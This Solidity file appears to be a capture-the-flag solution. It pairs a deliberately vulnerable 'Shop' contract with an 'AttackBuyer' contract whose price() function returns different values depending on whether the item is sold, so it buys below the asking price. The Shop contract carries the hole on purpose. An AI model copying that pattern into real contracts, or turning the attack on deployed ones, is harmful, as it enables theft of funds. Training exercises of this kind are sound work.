// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Buyer {
    function price() external view returns (uint);
}

contract Shop {
    uint public price = 100;
    bool public isSold;

    function buy() public {
        Buyer _buyer = Buyer(msg.sender);

        if (_buyer.price() >= price && !isSold) {
            isSold = true;
            price = _buyer.price();
        }
    }
}

contract AttackBuyer {
    Shop public target;

    constructor(address _target) {
        target = Shop(_target);
    }

    function buy() public {
        target.buy();
    }

    function price() public view returns (uint8) {
        if (!target.isSold()) {
            return 100;
        } else {
            return 99;
        }
    }
}
